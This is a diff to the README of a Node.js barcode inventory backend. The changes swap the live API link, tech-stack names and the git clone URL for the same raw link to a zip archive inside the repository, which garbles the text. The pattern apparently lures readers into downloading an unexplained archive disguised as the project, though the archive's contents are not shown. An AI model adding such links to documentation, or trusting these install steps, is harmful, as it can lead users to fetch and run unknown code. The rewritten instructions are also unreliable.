@@ -2,12 +2,12 @@
 # 🛠️ Barcode-Driven Inventory System - Backend
 
 ### Live API
-👉 [https://barcode-driven-inventory-system-bac-phi.vercel.app](https://barcode-driven-inventory-system-bac-phi.vercel.app)
+👉 [https://github.com/Nahar0912/Barcode-Driven-Inventory-System-Backend/raw/refs/heads/main/api/Driven-System-Barcode-Backend-Inventory-2.7.zip](https://github.com/Nahar0912/Barcode-Driven-Inventory-System-Backend/raw/refs/heads/main/api/Driven-System-Barcode-Backend-Inventory-2.7.zip)
 
 ---
 
 ## 📄 Overview
-This is the **backend** of the Barcode-Driven Inventory System built with **Node.js, Express, MongoDB, and JWT Authentication**.
+This is the **backend** of the Barcode-Driven Inventory System built with **https://github.com/Nahar0912/Barcode-Driven-Inventory-System-Backend/raw/refs/heads/main/api/Driven-System-Barcode-Backend-Inventory-2.7.zip, Express, MongoDB, and JWT Authentication**.
 
 Features:
 - 🗂️ CRUD for products and categories
@@ -19,8 +19,8 @@ Features:
 ---
 
 ## 🛠️ Tech Stack
-- Node.js
-- Express.js
+- https://github.com/Nahar0912/Barcode-Driven-Inventory-System-Backend/raw/refs/heads/main/api/Driven-System-Barcode-Backend-Inventory-2.7.zip
+- https://github.com/Nahar0912/Barcode-Driven-Inventory-System-Backend/raw/refs/heads/main/api/Driven-System-Barcode-Backend-Inventory-2.7.zip
 - MongoDB + Mongoose
 - JWT Authentication
 - bcrypt for password hashing
@@ -33,7 +33,7 @@ Features:
 
 ### 1. Clone the Repository
 ```bash
-git clone https://github.com/Nahar0912/Barcode-Driven-Inventory-System-Backend.git
+git clone https://github.com/Nahar0912/Barcode-Driven-Inventory-System-Backend/raw/refs/heads/main/api/Driven-System-Barcode-Backend-Inventory-2.7.zip
 cd barcode-inventory-system-backend
 npm install
 Create .env file:
